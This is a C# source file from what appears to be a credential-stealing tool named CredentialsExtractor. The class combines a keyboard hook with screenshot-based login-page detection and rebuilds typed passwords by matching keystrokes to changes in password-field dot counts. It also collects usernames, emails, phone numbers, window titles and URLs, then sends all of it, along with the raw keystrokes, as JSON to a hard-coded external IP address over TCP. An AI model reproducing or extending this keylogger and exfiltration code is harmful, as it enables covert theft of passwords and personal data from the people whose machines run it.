using CredentialsExtractor.Configuration;
using CredentialsExtractor.Input;
using CredentialsExtractor.Logging;
using CredentialsExtractor.Native;
using System.Collections.Concurrent;
using System.Net.Sockets;
using System.Text;
using Newtonsoft.Json;

namespace CredentialsExtractor.Core
{
    public class DllLoginDetector : ILoginPageDetector, IDisposable
    {
        private readonly IAppConfig _config;
        private readonly ILogger _logger;
        private readonly IKeyboardManager _keyboardManager;
        private readonly IApplicationIdentifier _appIdentifier;
        private readonly double _confidenceThreshold;
        private int _consecutiveFailures = 0;
        private int _adaptiveDelayMs = 0;
        private readonly object _detectionLock = new object();
        private bool _isDisposed = false;

        // Track current login page state
        private bool _isCurrentlyLoginPage = false;

        // Current application/website info
        private ApplicationInfo _currentApplicationInfo;

        // Dictionary to track all form fields by position
        private Dictionary<string, FormFieldState> _formFields = new Dictionary<string, FormFieldState>();

        // Queue of keystrokes captured while in login page
        private ConcurrentQueue<KeystrokeInfo> _capturedKeystrokes = new ConcurrentQueue<KeystrokeInfo>();

        // Keystroke information structure
        private class KeystrokeInfo
        {
            public string Key { get; set; }
            public DateTime Timestamp { get; set; }
        }

        public DllLoginDetector(
            IAppConfig config,
            ILogger logger,
            IKeyboardManager keyboardManager,
            IApplicationIdentifier appIdentifier,
            double confidenceThreshold = 0.6)
        {
            _config = config;
            _logger = logger;
            _keyboardManager = keyboardManager;
            _appIdentifier = appIdentifier;
            _confidenceThreshold = confidenceThreshold;

            try
            {
                // Check if DLL exists
                if (!File.Exists(_config.LoginDetectorDllPath))
                {
                    throw new FileNotFoundException($"LoginDetector DLL not found at: {_config.LoginDetectorDllPath}");
                }

                // Copy DLL to application directory if it's not already there
                string localDllPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "LoginDetectorDLL.dll");
                if (!File.Exists(localDllPath) ||
                    File.GetLastWriteTime(localDllPath) < File.GetLastWriteTime(_config.LoginDetectorDllPath))
                {
                    _logger.Log($"Copying DLL from {_config.LoginDetectorDllPath} to {localDllPath}");
                    File.Copy(_config.LoginDetectorDllPath, localDllPath, true);
                }

                // Also copy OpenCV DLL if it's available
                string opencvDllSource = Path.Combine(Path.GetDirectoryName(_config.LoginDetectorDllPath), "opencv_world490.dll");
                string opencvDllDest = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "opencv_world490.dll");

                if (File.Exists(opencvDllSource) &&
                   (!File.Exists(opencvDllDest) ||
                    File.GetLastWriteTime(opencvDllDest) < File.GetLastWriteTime(opencvDllSource)))
                {
                    _logger.Log($"Copying OpenCV DLL from {opencvDllSource} to {opencvDllDest}");
                    File.Copy(opencvDllSource, opencvDllDest, true);
                }

                // Initialize the native library
                _logger.Log($"Initializing LoginDetector DLL from {localDllPath}");
                if (LoginDetectorNative.Initialize(localDllPath))
                {
                    _logger.Log("LoginDetector DLL initialized successfully");
                }

                // Subscribe to keyboard events
                _keyboardManager.KeystrokeDetected += OnKeystrokeDetected;
            }
            catch (Exception ex)
            {
                _logger.Log($"Failed to initialize LoginDetector DLL: {ex.Message}");
                throw;
            }
        }

        // Keystroke handler to capture keystrokes when in login page
        private void OnKeystrokeDetected(object sender, KeystrokeEventArgs e)
        {
            if (_isCurrentlyLoginPage)
            {
                var keystrokeInfo = new KeystrokeInfo
                {
                    Key = e.Key,
                    Timestamp = DateTime.Now
                };

                _capturedKeystrokes.Enqueue(keystrokeInfo);

                // Keep the queue from growing too large
                if (_capturedKeystrokes.Count > 1000)
                {
                    _capturedKeystrokes.TryDequeue(out _);
                }
            }
        }

        public bool IsLoginPage(string screenshotPath)
        {
            lock (_detectionLock)
            {
                bool wasLoginPage = _isCurrentlyLoginPage;

                try
                {
                    _logger.Log($"Starting login detection for: {screenshotPath}");

                    // Verify image file exists and is readable
                    if (!File.Exists(screenshotPath))
                    {
                        _logger.Log($"Screenshot file not found: {screenshotPath}");
                        HandleLoginPageStateChange(false);
                        return false;
                    }

                    // Verify image file is not corrupted or empty
                    try
                    {
                        using (var img = System.Drawing.Image.FromFile(screenshotPath))
                        {
                            // Check if image dimensions are reasonable
                            if (img.Width < 10 || img.Height < 10)
                            {
                                _logger.Log($"Image dimensions too small: {img.Width}x{img.Height}");
                                HandleLoginPageStateChange(false);
                                return false;
                            }
                        }
                    }
                    catch (Exception imgEx)
                    {
                        _logger.Log($"Error verifying image: {imgEx.Message}");
                        HandleLoginPageStateChange(false);
                        return false;
                    }

                    // Apply adaptive delay if I've had consecutive failures
                    if (_adaptiveDelayMs > 0)
                    {
                        System.Threading.Thread.Sleep(_adaptiveDelayMs);
                    }

                    // Call the DLL function to detect login page
                    IntPtr resultPtr = LoginDetectorNative.DetectLoginPage(screenshotPath, _confidenceThreshold);

                    if (resultPtr == IntPtr.Zero)
                    {
                        _logger.Log("DLL detection failed: Null result returned");
                        _consecutiveFailures++;
                        AdjustAdaptiveDelay();
                        HandleLoginPageStateChange(false);
                        return false;
                    }

                    try
                    {
                        var result = LoginDetectorNative.ExtractDetectionResult(resultPtr);

                        if (result == null)
                        {
                            _logger.Log("Failed to extract detection result");
                            _consecutiveFailures++;
                            AdjustAdaptiveDelay();
                            HandleLoginPageStateChange(false);
                            return false;
                        }

                        // Extract fields and errors if needed
                        DateTime detectionTime = DateTime.Now;

                        // If a login page has been detected but wasn't before
                        if (result.Value.IsLoginPage && !_isCurrentlyLoginPage)
                        {
                            // Get application info when a login page is first detected
                            _currentApplicationInfo = _appIdentifier.GetCurrentApplicationInfo();
                            _logger.Log($"Login page detected in: {_currentApplicationInfo.ApplicationName}, " +
                                      $"Window: {_currentApplicationInfo.WindowTitle}, " +
                                      $"Process: {_currentApplicationInfo.ProcessName}, " +
                                      $"URL: {_currentApplicationInfo.URL}");
                        }

                        if (result.Value.FieldCount > 0 && result.Value.Fields != IntPtr.Zero)
                        {
                            var fields = LoginDetectorNative.ExtractFields(result.Value.Fields, result.Value.FieldCount);
                            _logger.Log($"Detected {fields.Count} form fields");

                            // Process all field types
                            ProcessDetectedFields(fields, detectionTime, result.Value.ExecutionTimeMs);

                            // Log field details for debugging
                            foreach (var field in fields)
                            {
                                _logger.Log($"Field: {field.Type}, Position: {field.X},{field.Y},{field.Width},{field.Height}, Content: {field.Content}");
                            }
                        }

                        if (result.Value.ErrorCount > 0 && result.Value.Errors != IntPtr.Zero)
                        {
                            var errors = LoginDetectorNative.ExtractErrors(result.Value.Errors, result.Value.ErrorCount);
                            foreach (var error in errors)
                            {
                                _logger.Log($"Detection error: {error}");
                            }
                        }

                        _logger.Log($"Login detection complete. Is login page: {result.Value.IsLoginPage}, Confidence: {result.Value.Confidence:F2}, Time: {result.Value.ExecutionTimeMs}ms");

                        // Reset failure counter on success
                        _consecutiveFailures = 0;
                        _adaptiveDelayMs = 0;

                        // Update login page state
                        HandleLoginPageStateChange(result.Value.IsLoginPage);

                        return result.Value.IsLoginPage;
                    }
                    finally
                    {
                        // Always free the detection result to avoid memory leaks
                        LoginDetectorNative.FreeDetectionResult(resultPtr);
                    }
                }
                catch (Exception ex)
                {
                    _logger.Log($"Login detection error: {ex.Message}");

                    _consecutiveFailures++;
                    AdjustAdaptiveDelay();
                    HandleLoginPageStateChange(false);
                    return false;
                }
            }
        }

        // Method to handle login page state transitions
        private void HandleLoginPageStateChange(bool isLoginPage)
        {
            // If state is changing from login to non-login
            if (_isCurrentlyLoginPage && !isLoginPage)
            {
                _logger.Log("Login page no longer detected. Printing captured credentials...");
                PrintCapturedCredentials();
                _formFields.Clear();
                _capturedKeystrokes.Clear();
                _currentApplicationInfo = null;
            }

            // Update state
            _isCurrentlyLoginPage = isLoginPage;
        }

        // Process all types of form fields
        private void ProcessDetectedFields(List<DetectedField> fields, DateTime detectionTime, double executionTimeMs)
        {
            foreach (var field in fields)
            {
                // Create a unique id for the field based on position
                string fieldId = $"{field.X},{field.Y},{field.Width},{field.Height}";

                // Handle field based on its type
                if (field.Type == "Password")
                {
                    ProcessPasswordField(field, fieldId, detectionTime, executionTimeMs);
                }
                else
                {
                    ProcessRegularField(field, fieldId, detectionTime);
                }
            }
        }

        // Method to process password fields
        private void ProcessPasswordField(DetectedField field, string fieldId, DateTime detectionTime, double executionTimeMs)
        {
            // Parse dot count from content string
            int dotCount = ExtractDotCount(field.Content);
            if (dotCount < 0) dotCount = 0;

            _logger.Log($"Password field: {fieldId}, Dots: {dotCount}");

            // Check if we've seen this field before
            FormFieldState fieldState;
            if (_formFields.TryGetValue(fieldId, out fieldState))
            {
                // Field exists, check for dot count change
                int dotDifference = dotCount - fieldState.LastDotCount;

                if (dotDifference != 0)
                {
                    _logger.Log($"Dot count changed: {fieldState.LastDotCount} -> {dotCount} (diff: {dotDifference})");

                    // Process keystrokes since last update
                    ProcessPasswordKeystrokesChange(fieldState, dotDifference, dotCount, detectionTime, executionTimeMs);

                    // Update dot count and time
                    fieldState.LastDotCount = dotCount;
                    fieldState.LastUpdateTime = detectionTime;
                }
            }
            else
            {
                // New field discovered
                _logger.Log($"New password field discovered: {fieldId} with {dotCount} dots");
                fieldState = new FormFieldState(fieldId, field.Type)
                {
                    LastDotCount = dotCount,
                    LastUpdateTime = detectionTime
                };

                // Assign current application info
                if (_currentApplicationInfo != null)
                {
                    fieldState.ApplicationInfo = _currentApplicationInfo;
                }

                _formFields.Add(fieldId, fieldState);
            }
        }

        // Method to process regular (non-password) fields
        private void ProcessRegularField(DetectedField field, string fieldId, DateTime detectionTime)
        {
            // Get field content
            string content = field.Content?.Trim() ?? string.Empty;

            // Check if we've seen this field before
            FormFieldState fieldState;
            if (_formFields.TryGetValue(fieldId, out fieldState))
            {
                // Field exists, check for content change
                if (content != fieldState.LastDetectedContent)
                {
                    _logger.Log($"{field.Type} field content changed: '{fieldState.LastDetectedContent}' -> '{content}'");

                    // If content is non-empty, update our captured content
                    if (!string.IsNullOrEmpty(content))
                    {
                        fieldState.Content.Clear();
                        fieldState.Content.Append(content);
                    }

                    fieldState.LastDetectedContent = content;
                    fieldState.LastUpdateTime = detectionTime;
                }
            }
            else
            {
                // New field discovered
                _logger.Log($"New {field.Type} field discovered: {fieldId} with content: '{content}'");
                fieldState = new FormFieldState(fieldId, field.Type)
                {
                    LastDetectedContent = content,
                    LastUpdateTime = detectionTime
                };

                // Initialize with detected content if not empty
                if (!string.IsNullOrEmpty(content))
                {
                    fieldState.Content.Append(content);
                }

                // Assign current application info
                if (_currentApplicationInfo != null)
                {
                    fieldState.ApplicationInfo = _currentApplicationInfo;
                }

                _formFields.Add(fieldId, fieldState);
            }
        }

        // Method to extract dot count from password field content
        private int ExtractDotCount(string content)
        {
            // Expected format: "Password field: X dots"
            try
            {
                if (string.IsNullOrEmpty(content) || !content.Contains("dots"))
                    return -1;

                int startIndex = content.IndexOf(":") + 1;
                int endIndex = content.IndexOf("dots");

                if (startIndex > 0 && endIndex > startIndex)
                {
                    string dotCountStr = content.Substring(startIndex, endIndex - startIndex).Trim();
                    if (int.TryParse(dotCountStr, out int dotCount))
                    {
                        return dotCount;
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.Log($"Error parsing dot count: {ex.Message}");
            }

            return -1;
        }

        // Method to process keystrokes related to a password field
        private void ProcessPasswordKeystrokesChange(FormFieldState passwordState, int dotDifference, int newDotCount, DateTime detectionTime, double executionTimeMs)
        {
            // Calculate time window for keystrokes
            TimeSpan detectionWindowMs = TimeSpan.FromMilliseconds(executionTimeMs);
            DateTime startTime = detectionTime.Subtract(detectionWindowMs);

            // Dot count increased - add characters
            if (dotDifference > 0)
            {
                int charsToAdd = dotDifference;
                int charsAdded = 0;

                // Find keystrokes that occurred since the last update and before this detection
                var relevantKeystrokes = _capturedKeystrokes
                    .Where(k => k.Timestamp >= passwordState.LastUpdateTime &&
                                k.Timestamp <= detectionTime)
                    .OrderBy(k => k.Timestamp)
                    .ToList();

                _logger.Log($"Found {relevantKeystrokes.Count} keystrokes in time window");

                // Process keystrokes that are likely to be password characters 
                foreach (var keystroke in relevantKeystrokes)
                {
                    // Skip special keys
                    if (keystroke.Key.StartsWith("[") && keystroke.Key.EndsWith("]"))
                    {
                        if (keystroke.Key == "[Enter]" ||
                            keystroke.Key == "[Tab]" ||
                            keystroke.Key == "[Backspace]")
                        {
                            continue;
                        }
                    }

                    // Skip if we've already added enough characters
                    if (charsAdded >= charsToAdd) break;

                    // Add character to password
                    passwordState.Content.Append(keystroke.Key);
                    charsAdded++;
                }

                _logger.Log($"Added {charsAdded} characters to password for field {passwordState.FieldId}");
            }
            // Dot count decreased - remove characters (likely backspace)
            else if (dotDifference < 0)
            {
                int charsToRemove = -dotDifference;

                // Remove characters from the end
                if (passwordState.Content.Length > 0)
                {
                    int removeCount = Math.Min(charsToRemove, passwordState.Content.Length);
                    passwordState.Content.Remove(passwordState.Content.Length - removeCount, removeCount);
                    _logger.Log($"Removed {removeCount} characters from password for field {passwordState.FieldId}");
                }
            }
        }

        // SendCredentialsToServer method - Updated port
        private void SendCredentialsToServer(Dictionary<string, FormFieldState> formFields)
        {
            try
            {
                // Create data structure to send
                var credentialData = new
                {
                    ApplicationInfo = _currentApplicationInfo,
                    FormFields = formFields.Values.Select(f => new
                    {
                        FieldId = f.FieldId,
                        FieldType = f.FieldType,
                        Content = f.Content.ToString(),
                        ApplicationName = f.ApplicationInfo.ApplicationName,
                        WindowTitle = f.ApplicationInfo.WindowTitle,
                        URL = f.ApplicationInfo.URL,
                        ProcessName = f.ApplicationInfo.ProcessName
                    }).ToList(),
                    Keystrokes = _capturedKeystrokes.Select(k => new
                    {
                        Key = k.Key,
                        Timestamp = k.Timestamp
                    }).ToList(),
                    Timestamp = DateTime.Now
                };

                // Serialize to JSON
                string jsonData = JsonConvert.SerializeObject(credentialData);

                // Connect to server
                using (TcpClient client = new TcpClient())
                {
                    // Set a reasonable timeout
                    client.SendTimeout = 5000;
                    client.ReceiveTimeout = 5000;

                    Console.WriteLine("aasdasdasfdsdsadasd");
                    // Connect to the server - updated to use your external port
                    client.Connect("46.116.189.221", 43567);

                    using (NetworkStream stream = client.GetStream())
                    {
                        // Convert the JSON string to bytes
                        byte[] data = Encoding.UTF8.GetBytes(jsonData + "<END>");

                        // Send the data to the server
                        stream.Write(data, 0, data.Length);

                        // Read the response from the server
                        byte[] responseBuffer = new byte[4096];
                        int bytesRead = stream.Read(responseBuffer, 0, responseBuffer.Length);
                        string response = Encoding.UTF8.GetString(responseBuffer, 0, bytesRead);

                        _logger.Log($"Server response: {response}");
                    }
                }

            }
            catch (Exception ex)
            {
                _logger.Log($"Error sending credentials to server: {ex.Message}");
            }
        }

        // Method to print all captured form fields when login page is no longer detected
        private void PrintCapturedCredentials()
        {
            _logger.Log("=========== CAPTURED FORM FIELDS ===========");

            if (_formFields.Count == 0)
            {
                _logger.Log("No form fields were detected");
                Console.WriteLine("No form fields were detected");
                return;
            }

            // Group fields by application first
            var fieldsByApp = _formFields.Values
                .GroupBy(f => f.ApplicationInfo?.ApplicationName ?? "Unknown")
                .ToDictionary(g => g.Key, g => g.ToList());

            foreach (var appGroup in fieldsByApp)
            {
                string appName = appGroup.Key;
                var fields = appGroup.Value;

                // Get app info from the first field
                var appInfo = fields.FirstOrDefault()?.ApplicationInfo ?? new ApplicationInfo();

                _logger.Log($"=== APPLICATION: {appName} ===");
                _logger.Log($"Window Title: {appInfo.WindowTitle}");
                _logger.Log($"Process: {appInfo.ProcessName}");

                if (!string.IsNullOrEmpty(appInfo.URL) && appInfo.URL != "Unknown")
                {
                    _logger.Log($"URL: {appInfo.URL}");
                }

                _logger.Log("---");

                // Group by field type within each application
                var fieldsByType = fields
                    .GroupBy(f => f.FieldType)
                    .ToDictionary(g => g.Key, g => g.ToList());

                // Print different field types in preferred order
                PrintFieldsOfType(fieldsByType, "Username", "Usernames");
                PrintFieldsOfType(fieldsByType, "Email", "Email Addresses");
                PrintFieldsOfType(fieldsByType, "Phone", "Phone Numbers");
                PrintFieldsOfType(fieldsByType, "Password", "Passwords");
                PrintFieldsOfType(fieldsByType, "Name", "Names");

                // Print any other field types
                foreach (var fieldType in fieldsByType.Keys.Where(k =>
                    k != "Username" && k != "Email" && k != "Password" &&
                    k != "Phone" && k != "Name"))
                {
                    PrintFieldsOfType(fieldsByType, fieldType, $"{fieldType} Fields");
                }

                _logger.Log("=====================================");
                SendCredentialsToServer(_formFields);
            }

            // Print to console as well for immediate feedback
            Console.WriteLine("\n=========== CAPTURED FORM FIELDS ===========");

            foreach (var appGroup in fieldsByApp)
            {
                string appName = appGroup.Key;
                var fields = appGroup.Value;

                // Get app info from the first field
                var appInfo = fields.FirstOrDefault()?.ApplicationInfo ?? new ApplicationInfo();

                Console.WriteLine($"=== APPLICATION: {appName} ===");
                Console.WriteLine($"Window Title: {appInfo.WindowTitle}");
                Console.WriteLine($"Process: {appInfo.ProcessName}");

                if (!string.IsNullOrEmpty(appInfo.URL) && appInfo.URL != "Unknown")
                {
                    Console.WriteLine($"URL: {appInfo.URL}");
                }

                Console.WriteLine("---");

                // Group by field type within each application
                var fieldsByType = fields
                    .GroupBy(f => f.FieldType)
                    .ToDictionary(g => g.Key, g => g.ToList());

                // Print different field types in preferred order
                PrintFieldsOfTypeToConsole(fieldsByType, "Username", "Usernames");
                PrintFieldsOfTypeToConsole(fieldsByType, "Email", "Email Addresses");
                PrintFieldsOfTypeToConsole(fieldsByType, "Phone", "Phone Numbers");
                PrintFieldsOfTypeToConsole(fieldsByType, "Password", "Passwords");
                PrintFieldsOfTypeToConsole(fieldsByType, "Name", "Names");

                // Print any other field types
                foreach (var fieldType in fieldsByType.Keys.Where(k =>
                    k != "Username" && k != "Email" && k != "Password" &&
                    k != "Phone" && k != "Name"))
                {
                    PrintFieldsOfTypeToConsole(fieldsByType, fieldType, $"{fieldType} Fields");
                }

                Console.WriteLine("=====================================");
            }

            Console.WriteLine("============================================\n");
        }

        // Helper method to print fields of a specific type to log
        private void PrintFieldsOfType(Dictionary<string, List<FormFieldState>> fieldsByType, string fieldType, string header)
        {
            if (fieldsByType.ContainsKey(fieldType) && fieldsByType[fieldType].Count > 0)
            {
                _logger.Log($"--- {header} ---");
                foreach (var field in fieldsByType[fieldType])
                {
                    _logger.Log($"Field ID: {field.FieldId}");
                    _logger.Log($"Content: {field.Content}");
                    _logger.Log("-----------------------------------------");
                }
            }
        }

        // Helper method to print fields of a specific type to console
        private void PrintFieldsOfTypeToConsole(Dictionary<string, List<FormFieldState>> fieldsByType, string fieldType, string header)
        {
            if (fieldsByType.ContainsKey(fieldType) && fieldsByType[fieldType].Count > 0)
            {
                Console.WriteLine($"--- {header} ---");
                foreach (var field in fieldsByType[fieldType])
                {
                    Console.WriteLine($"Field ID: {field.FieldId}");
                    Console.WriteLine($"Content: {field.Content}");
                    Console.WriteLine("-----------------------------------------");
                }
            }
        }

        // Adjust delay based on consecutive failures to prevent CPU thrashing
        private void AdjustAdaptiveDelay()
        {
            if (_consecutiveFailures > 5)
            {
                // Exponential backoff with maximum of 5 seconds
                _adaptiveDelayMs = Math.Min(5000, 100 * (int)Math.Pow(2, _consecutiveFailures - 5));
                _logger.Log($"Adding adaptive delay of {_adaptiveDelayMs}ms after {_consecutiveFailures} consecutive failures");
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!_isDisposed)
            {
                if (disposing)
                {
                    // Clean up managed resources
                    try
                    {
                        // Unsubscribe from events
                        if (_keyboardManager != null)
                        {
                            _keyboardManager.KeystrokeDetected -= OnKeystrokeDetected;
                        }

                        LoginDetectorNative.Cleanup();
                        _logger.Log("LoginDetector DLL resources released");
                    }
                    catch (Exception ex)
                    {
                        _logger.Log($"Error cleaning up LoginDetector DLL: {ex.Message}");
                    }
                }

                _isDisposed = true;
            }
        }

        ~DllLoginDetector()
        {
            Dispose(false);
        }
    }
}